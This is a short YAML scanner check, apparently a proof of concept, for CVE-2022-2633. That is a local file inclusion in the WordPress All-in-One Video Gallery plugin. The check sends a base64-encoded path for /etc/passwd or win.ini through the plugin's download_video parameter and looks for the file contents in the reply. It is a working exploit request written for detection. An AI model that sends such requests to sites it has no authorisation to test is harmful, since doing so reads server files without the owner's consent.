name: poc-yaml-wordpress-all-in-one-video-gallery-cve-2022-2633-lfi
manual: true
transport: http
set:
    r1: base64("/etc/passwd")
    r2: base64("C:\\windows\\win.ini")
rules:
    linux:
        request:
            cache: true
            method: GET
            path: /wp-admin/admin-post.php?page=download_video&dl={{r1}}
        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
    windows:
        request:
            cache: true
            method: GET
            path: /wp-admin/admin-post.php?page=download_video&dl={{r2}}
        expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
expression: linux() || windows()
detail:
    author: socat
    links:
        - https://www.wordfence.com/vulnerability-advisories/#CVE-2022-2633
    vulnerability:
        id: CT-481452
        level: high
